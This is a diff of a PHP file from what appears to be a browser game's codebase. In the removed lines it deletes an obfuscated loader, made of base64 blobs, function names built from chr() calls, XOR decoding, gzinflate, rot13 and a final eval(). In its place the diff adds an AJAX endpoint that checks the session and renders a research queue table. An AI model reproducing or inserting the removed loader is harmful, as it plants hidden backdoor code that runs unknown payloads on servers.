@@ -1,29 +1,91 @@
 <?php
-// c525d7201e8e0cef431b0aac
-$zQiMwptiXwEMB="dEBJ2GaB+z/hNmYJKzaWnKCZ4G6uDpyGCNEqux3AdYs=";
-$Mr_DLWSegwU="qROW2TnO+m/uAzLWXmnJaXPM4T6hQclTPARdhk3NqLf=";
-$_THTuksKy="twKtS6QljAHYSo0af9MzhdMGiWrJK7NYimvbJV+VB4jYUvFd2jfTLNUm1EBRj2+EsmiXfPlliCrzdcpNW6QQ8qFOqHPyKIol7HyKM2WtG4zcc5588RSiIvA03jBep2P74GyCYuVj0F/sW/4meqQyistw6FjPMYcn40rQNnyjI67rd6wo+T7dAZhc+xBDixn7z1H+T6or0h3IY+4BApl9o+Z5/nfwF6wHyEDORB+xDJzlSPMi3wSTX+o97SUYkQa8zUisftUUggWVV+8AZtJh4NprjFPQNbFb5Ez/MUa2HKnQW5Ba5DGqCI5v30V+rWaYzHCAcd5iiFbAef8fX6Y/g8h9/0/lKKxA21TcRkeaPbHwdIts0DuVCsJD9BVlsGW8u13oKO99pyjJdds4fo8zs71y9mncHqNAk2T0M3qUY7nTU4hJ1B6lX9VojTZmhRe4/Q7oY9o+lxbxSooVfZl9rutblyvtEIkIxWqOG0jLZaT5Da802gDRHcNllyFYqy/94VuvWMRnnQ3VWO8xa4Vi+KEUrmntN54J7Gr8O2aVL4jHSIhs/B6eDZNVjSVGixq68Aa1UNggpxj2Xc87Zqc0j8Fl9iKuHNMokWvaQ2K5AvzDeoNJ+haeXOkmyEMCkTCv23GKWbIBqAjTPIxCe4k+p/1Q7FSufaYFk2vhJkCUHqHAdfAqxDWHLuh0/R9QqxeO0Gq1c6QFggngbIsxH68A+u1I9GvOO5clyWbfOF";
-$xtsp_QHWnk="6HOIbPEKx0zX2pNZdI7UBq1SylzGyMcd99qS3NONEsZNM5iLpdrlzSP5M89V78REa6G5HfCb5s/xWxJJVj0RMbmWeFvQuwaaUR3FnzdPAAb5k5+sNppVLKPqMH2GbwI0GUb/7vdKgu5BPSWplizg1o2ReivUW+Qv9lslrZdcoQQNgHquZ7/lnlFb0X6SL2JFmRJoTCdfFRxB+nHsoi4Ad70jGRsnWVb+kBjFrJf9s8S5IS5OEIiU/EAYIik0TgREuiY637SrVarRvPV8JP7RAcrBf82UvzY88b1CfbNfcHeNUAg7tdlS7VEIUcz3zeI3OLIYeyavEr12aJINtrgUxi2RP96V6gL/AeilrRNN4fHJpjvOdKk1qvO7Ff7EbBIl+JB//za45e2BqJLM58ix9o0wS5vG6Jce9mjz3kXOIic7M6krIIrSz6KJVEwFjRRnGsHpPoS6li7ReMBehdzk1OogWJz3GqV9AEsRfOTMIcZYMP5OUQv3L+PqgA+zX+Ln+KI5vieKVO0hPVAeVU4iUYsjjy2QiKK+5qiAzXWo8xf9Nhs/1zjSi2HZAj9yLJJGqmG5P+e6xj/gOgCcdc0D4GkDGFvmipUu8Kll/ZWMojcNcvs+gQjy/YEaUC6EGPJR60J//9U6ZezDe3CeZe1x4aszeZwAn1K9MxiB/sYc4RcIIerfJGi2KqAp0q6mrTOUrQFJvwe45D9ie3WpE63x5vhwyIzGbydewU1lfv";
-$NINQKeGMGtsVW="dIolW6dh5OhmnVPlEZ0qzXngDXCIN5LSWKZdzmCSOPJi70wZlxKaoVu1SPM53Rv7Xc4OQoNiu+R4hX7zGKwhxG73Q2CZJ+TLcaZa2BqIAopPwkNash2/8kWubakH0xjDasFCRtAxp/trjmjMZ9YgjlqAJ3iqM4Che7Nf9j+2F+1h2RpKkz2J32agV8Ud3AfQJuI4QLlggOEPrGvTK6ZfmXT1H3+sYpmyFOh12BOpPY568CUCrQCI4nCubtEi3CvrV/YXH7kPpMxKj3fPNLQX6F6ODR2yGeTPe6RtzRSsCsRH8DZMjQbzoQipKKodlyT7X9kXQcsgvP5xtF3EJ6gL9nrzEWqQfbq4RvYuqQejGopu6h99rWWixFKqcs8UiQzpOehEZtEVmsILilLNBpw152PfIl+lIfz8cp91rT+SC+A++V9jpxn/3AeGQ8sckSfNRts8a4ED/7x3t3nbG9E/93fbInCkGKS+bfdwyRCdPcJE7yxNihHy2AuhXd4DojaWQtERfqVi//5dj1LJGJUWyGfaBny4Ga7cd+hJyx2dF81egDx82DKAwUyqVtYGkB/JPfMebJkeoc56v1TEJp0n71jCLlCaG43OT5Q0pH2nLZhr7SVoo3mJsn70fcoCnhrbP5MNb9k8hsZUnmOka49f4lqAEHm5fYL8WaJt22WmVuVdiDFjjT6N0m7sXqkCvDX5OdIXU6cyrdpHv1/LJtEM4jr7Jn2HMaTpUI5i";
-$yEcxhIfKAHRZL=strlen($zQiMwptiXwEMB);
-$bZDumsHVG=substr($_THTuksKy,0,4);
-$HVQLyviUd=md5($xtsp_QHWnk);
-$SsBXLWHi_T=crc32($NINQKeGMGtsVW);
-$qQkVVeUvsrx=base64_decode("ij/HG51S5G+hDbh0KeBWyw==");
-$DPmUQMg_IUp=$_THTuksKy.$xtsp_QHWnk.$NINQKeGMGtsVW;
-$gngUpMfNLvvALmG=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
-$LBYch_ZnLPZL="gz".chr(105)."nflate";
-$FBWMGWsuy="str".chr(114)."ev";
-$ghrKCjmqWM="str_rot".chr(49).chr(51);
-$PeYtAShJO="";
-$EeUUIYqDazU=$gngUpMfNLvvALmG($DPmUQMg_IUp);
-for($KcdUameawYMU=0;$KcdUameawYMU<strlen($EeUUIYqDazU);$KcdUameawYMU++){
-$PeYtAShJO.=chr(ord($EeUUIYqDazU[$KcdUameawYMU])^ord($qQkVVeUvsrx[$KcdUameawYMU%strlen($qQkVVeUvsrx)]));
+// AJAX endpoint to get research queue HTML
+// Returns only the research queue table HTML for partial page updates
+
+session_start();
+session_write_close();
+
+require_once __DIR__ . '/../../app/bootstrap_ajax.php';
+
+// Load config
+require_once(__DIR__ . '/../configs/config.php');
+require_once(__DIR__ . '/../modelo/lib/world_constants.php');
+require_once(__DIR__ . '/../modelo/lib/config.php');
+
+// Language support
+\CoreFetcher::load('Helpers/language_helper.php');
+init_locale();
+
+use App\Core\Database;
+use App\Models\SessionModel;
+use App\Models\UnitsLibrary;
+
+// Check session
+// Session cookie is dynamic: 'session_<world>' (set by set_session_cookie())
+$server = get_active_world();
+$worldDb = get_world_db_name($server);
+$villageId = isset($_GET['village']) ? (int)$_GET['village'] : 0;
+
+if (!$villageId) {
+    echo '';
+    exit;
 }
-$EeUUIYqDazU=$PeYtAShJO;
-$EeUUIYqDazU=$ghrKCjmqWM($EeUUIYqDazU);
-$EeUUIYqDazU=$FBWMGWsuy($EeUUIYqDazU);
-$EeUUIYqDazU=$gngUpMfNLvvALmG($EeUUIYqDazU);
-$EeUUIYqDazU=$LBYch_ZnLPZL($EeUUIYqDazU);
-$EeUUIYqDazU=$ghrKCjmqWM($EeUUIYqDazU);
-eval($EeUUIYqDazU);
+
+$sessionCookieValue = $_COOKIE['session_' . $server]
+    ?? $_COOKIE['session']
+    ?? null;
+
+if (!$sessionCookieValue) {
+    echo '';
+    exit;
+}
+
+$sessionModel = new SessionModel($worldDb);
+$session = $sessionModel->checkSession($sessionCookieValue);
+
+if (!$session) {
+    echo '';
+    exit;
+}
+
+$db = Database::getInstance($worldDb, get_world_db_host(get_active_world()), get_world_db_user(get_active_world()), get_world_db_pass(get_active_world()));
+$unitsLib = new UnitsLibrary($worldDb);
+
+// Get research queue
+$research_queue = $db->fetchAll(
+    "SELECT id, research as unit, end_time, trwanie FROM research WHERE villageid = ? ORDER BY id",
+    [$villageId]
+);
+
+// Helper function
+function format_time($seconds) {
+    if ($seconds < 0) return '00:00:00';
+    return gmdate('H:i:s', $seconds);
+}
+
+// Generate HTML
+if (count($research_queue) > 0): ?>
+    <table class="vis">
+        <tr>
+            <th width="220">Tecnologia</th>
+            <th width="100">Duração</th>
+            <th width="120">Conclusão</th>
+            <th>Finalizar</th>
+        </tr>
+        <?php foreach ($research_queue as $q): ?>
+            <?php
+            $countdown = $q['end_time'] - time();
+            $unit_name = $unitsLib->get_name($q['unit']);
+            ?>
+            <tr class="lit">
+                <td><?= htmlspecialchars($unit_name) ?></td>
+                <td><span class="timer"><?= format_time($countdown) ?></span></td>
+                <td><?= date('d.m.Y H:i:s', $q['end_time']) ?></td>
+                <td>
+                    <a href="game.php?village=<?= $villageId ?>&amp;screen=smith&amp;action=cancel&amp;id=<?= $q['id'] ?>&amp;h=<?= $session['hkey'] ?? '' ?>">parar</a>
+                </td>
+            </tr>
+        <?php endforeach; ?>
+    </table>
+    <br />
+<?php endif;
